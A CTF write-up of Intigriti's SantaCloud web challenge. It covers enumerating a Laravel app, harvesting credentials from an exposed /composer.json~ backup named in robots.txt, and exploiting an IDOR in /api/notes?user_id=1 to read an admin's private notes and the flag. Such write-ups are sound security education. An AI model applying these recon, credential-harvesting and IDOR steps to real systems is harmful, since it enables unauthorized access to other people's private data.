# Intigriti's SantaCloud CTF challenge by [INTIGRITI](https://x.com/intigriti)

## Description

The solution:

- Should leverage a vulnerability on the challenge page.
- Shouldn't be self-XSS or related to MiTM attacks.
- Should require no user interaction.
- Should require no bruteforcing (if you have to, keep requests below 1 req/sec).
- Should include:
  - The flag in the format INTIGRITI{.\*}
  - The payload(s) used
  - Steps to solve (short description / bullet points)
- Should be reported on the Intigriti platform.

Get started:

Repeat your attack against the [challenge server](https://santacloud.intigriti.io/home).

## TL;DR

* Identified exposed backend APIs under `/api/` and disallowed files via `robots.txt`

* Discovered an accessible backup file (`/composer.json~`) leaking credentials

* Logged in using leaked credentials (elf_supervisor)

* Enumerated users via `/api/users`, identifying a higher-privileged admin account

* Discovered an unlinked `/api/notes` endpoint

* Exploited an **IDOR** vulnerability by querying notes with `/api/notes?user_id=1`

* Retrieved private admin notes, including the flag `INTIGRITI{019b118e-e563-7348-a377-c1e5f944bb46}`

## Analysis

The target is a **black-box web application** implementing a supply-chain portal for coordinating Christmas gifts, a system of... debatable usefulness.
I mean, who would actually need something like this? Right?

![](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExbDZhdzU1NTR4dDkxZXdoNDNsOGE3M2pwbDljMnE5djhzc3czOXh3NiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l2SqbZ1ggNuRHZkeA/giphy.gif)

At this point, we can only trust that the devel(f)opers implemented this correctly. Otherwise, Christmas might not survive the deployment.

![login](./imgs/login.png)

With no option for user registration and authentication restricted to existing accounts, the attack surface initially lies outside the login flow.
Broad reconnaissance and endpoint enumeration are necessary to uncover exposed APIs, leaked data, and misconfigurations that could be chained into an authentication bypass.

The presence of the `laravel_session` cookie confirms the use of the Laravel framework, providing useful context for further enumeration.

The relevant endpoints were identified through **file/directory enumeration** performed with [gobuster](https://github.com/OJ/gobuster).
These are listed below:

```bash
/                     (Status: 200) [Size: 3924]
/cgi-bin/             (Status: 301) [Size: 335] [--> http://santacloud.intigriti.io/cgi-bin]
/css                  (Status: 301) [Size: 332] [--> http://santacloud.intigriti.io/css/]
/home                 (Status: 200) [Size: 8094]
/images               (Status: 301) [Size: 335] [--> http://santacloud.intigriti.io/images/]
/inventory            (Status: 200) [Size: 11499]
/login                (Status: 200) [Size: 5883]
/map                  (Status: 200) [Size: 12945]
/notes                (Status: 200) [Size: 15135]
/profile              (Status: 200) [Size: 7523]
/up                   (Status: 200) [Size: 1954]
```

Moreover, inspection of the login page source code reveals that backend endpoints are exposed under the `/api/` path.

```js
const response = await fetch("/api/login", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    Accept: "application/json",
  },
  body: JSON.stringify({ username, password }),
});
```

All exposed backend endpoints can be identified through directory enumeration of the `/api/` subpaths.

```bash
/                     (Status: 301) [Size: 331] [--> http://santacloud.intigriti.io/api]
/cgi-bin/             (Status: 301) [Size: 339] [--> http://santacloud.intigriti.io/api/cgi-bin]
/gifts                (Status: 401) [Size: 30]
/health               (Status: 200) [Size: 52]
/login                (Status: 405) [Size: 1011]
/logout               (Status: 405) [Size: 1011]
/me                   (Status: 401) [Size: 30]
/notes                (Status: 401) [Size: 30]
/users                (Status: 401) [Size: 30]
```

This is a promising starting point, but all endpoints, apart from `/login`, properly enforce authorization using session tokens:

```bash
$ curl -L http://santacloud.intigriti.io/api/users
{"error":"Token not provided"}
```

This could have been useful if possible to potentially leak credentials.

Running Nmap against the web application host reveals several disallowed entries quietly left under the Christmas tree 🎁🎄.

```bash
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx (reverse proxy)
|_http-title: 308 Permanent Redirect
443/tcp open  ssl/http nginx (reverse proxy)
| ssl-cert: Subject: commonName=santacloud.intigriti.io
| Subject Alternative Name: DNS:santacloud.intigriti.io
| Not valid before: 2025-12-17T11:25:45
|_Not valid after:  2026-03-17T11:25:44
|_ssl-date: TLS randomness does not represent time
|_http-title: Intigriti SantaCloud CTF
| http-robots.txt: 8 disallowed entries
| /package.json /backup.json /artisan /.env /.env.local
|_/composer.json /composer.json* /composer.json~
```

This turns out to be a good catch, and, fortunately one of these entries (`/composer.json~`) is exposed:

```json
{
  "name": "intigriti-challenges/santacloud",
  "type": "project",
  "description": "SantaCloud - Supply Chain Portal",
  "version": "13.3.7",
  "keywords": ["laravel", "gifts", "christmas"],
  "license": "MIT",
  "config": {
    "admin-access": {
      "username": "elf_supervisor",
      "password": "CookiesAndMilk1337",
      "api-endpoint": "http://santacloud.intigriti.io/login"
    },
    "env": {
      "secret": "INTIGRITI{019b118e-e563-7348",
      "ttl": 3600
    }
  },
  "require": {
    "php": "^8.2",
    "laravel/framework": "^10.0",
    "firebase/php-jwt": "^6.10"
  },
  "authors": [
    {
      "name": "Elf Supervisor",
      "email": "devops@santacloud.intigriti.io"
    }
  ],
  "support": {}
}
```

The file leaks configuration and environment details, including **valid sign-in credentials**:

    elf_supervisor:CookiesAndMilk1337

## Exploit

With the obtained credentials in hand, logging in allows full interaction with the features and endpoints identified during reconnaissance.

![home](./imgs/home.png)

A successful `/api/login` request correctly issues and associates an authentication token, under `auth_token` cookie, with the user, which is required to authorize subsequent backend endpoint requests and operations.

```http
HTTP/2 200 OK
Date: Thu, 01 Jan 2026 18:07:16 GMT
Content-Type: application/json
X-Powered-By: PHP/8.2.30
Cache-Control: no-cache, private
Access-Control-Allow-Origin: *
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  "success": true,
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjcyOTA4MzYsImV4cCI6MTc2NzI5NDQzNiwiZGF0YSI6eyJpZCI6MiwidXNlcm5hbWUiOiJlbGZfc3VwZXJ2aXNvciIsInJvbGUiOiJhZG1pbiJ9fQ.pTmIcRB8Lf6gSZ5RS-BTXaFzeNmG7e1xSAkBz7h13o4",
  "user": {
    "id": 2,
    "username": "elf_supervisor",
    "role": "admin"
  }
}
```

The `/dashboard` page client source code demonstrates how the `auth_token` is used in order to interact with the authenticated endpoints:

```js
// Check authentication
const token = localStorage.getItem('auth_token');
...
// Call logout API
await fetch('/api/logout', {
    method: 'POST',
    headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
        }
    });
```

At this point, we have everything we need to try to extract sensitive information from the backend.
The first thing to try is to see what a request to `/api/users` returns:

```http
HTTP/2 200 OK
Date: Thu, 01 Jan 2026 18:37:49 GMT
Content-Type: application/json
Vary: Authorization
X-Powered-By: PHP/8.2.30
Cache-Control: no-cache, private
Access-Control-Allow-Origin: *
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
    "success":true,
    "users":
    [
        {
            "id":1,
            "username":"admin",
            "role":"superadmin"
        },
        {
            "id":2,
            "username":"elf_supervisor",
            "role":"admin"
        }
    ]
}
```

Interesting, an admin with higher privileges than our current user exists (perhaps 🎅🏻 in person?).
Let’s pretend that’s not important.

Interestingly, all API endpoints appear to be mapped to frontend features, except for `/notes`, which is conspicuously absent.
That alone makes it worth a closer look.

![notes](./imgs/notes.png)

Behind the scenes, the `/notes` endpoint returns only the notes associated with the currently authenticated user.

```http
HTTP/2 200 OK
Date: Thu, 01 Jan 2026 19:02:56 GMT
Content-Type: application/json
Vary: Authorization
X-Powered-By: PHP/8.2.30
Cache-Control: no-cache, private
Access-Control-Allow-Origin: *
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
    "success": true,
    "notes": [],
    "user_id": 2
}
```

From the page source code:

```js
const url = noteId ? `/api/notes/${noteId}` : "/api/notes";
```

Notes are indexed and individually retrievable by their ID.
While this behavior is not inherently vulnerable, a lack of proper access control could lead to an **Insecure Direct Object Reference (IDOR)**.

Moreover, the JSON response format hints that notes can be queried on a per-user basis, likely using a parameter such as `/api/notes?user_id=<id>`.

If the latter approach works, it is the more efficient choice, since the user base and their IDs are already known.
Blindly enumerating individual notes would likely provide little value.


```http
HTTP/2 200 OK
Date: Fri, 02 Jan 2026 10:13:22 GMT
Content-Type: application/json
Vary: Authorization
X-Powered-By: PHP/8.2.30
Cache-Control: no-cache, private
Access-Control-Allow-Origin: *
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  "success": true,
  "notes": [
    {
      "id": 1,
      "user_id": 1,
      "title": "Q4 Distribution Strategy",
      "content": "Northern routes have been optimized as of the 24th of December 2025 (reported to me by The Elf). Prioritizing high-volume regions: North America (40%), Europe (30%), Asia-Pacific (20%), Others (10%). Weather concerns for December 24-25 window to be analyzed in advance.",
      "is_private": true,
      "created_at": "2025-12-25T18:59:10.000000Z",
      "updated_at": "2025-12-25T18:59:10.000000Z"
    },
    {
      "id": 2,
      "user_id": 1,
      "title": "Important Note",
      "content": "My memory isn't what it used to be, so I've taken the necessary precautions to keep important information safe. Therefore, I've ensured that I store the full access key in two different locations online, although I prefer traditional storage over the fancy cloud services that everyone keeps promoting. If you're reading this, you should have access to the first part now. The second part is stored in a private note, which the developer of SantaCloud assured would only be accessible by me. When combined, this key unlocks our central repository where all this year's deliverables are kept. Only I should have authorization to access it.",
      "is_private": true,
      "created_at": "2025-12-25T18:59:10.000000Z",
      "updated_at": "2025-12-25T18:59:10.000000Z"
    },
    {
      "id": 3,
      "user_id": 1,
      "title": "The Secret Key",
      "content": "INTIGRITI{019b118e-e563-7348-a377-c1e5f944bb46}",
      "is_private": true,
      "created_at": "2025-12-25T18:59:10.000000Z",
      "updated_at": "2025-12-25T18:59:10.000000Z"
    }
  ],
  "user_id": "1"
}
```

Luckily (or unluckily for SantaCloud), the intuition holds up: an IDOR vulnerability allows access to private notes belonging to another user, flag included.

Christmas is technically saved, the flag is recovered, but SantaCloud’s secrets are clearly not. At least now the elves know they should probably fix their access controls before next December 🎄🎁🎅🏻.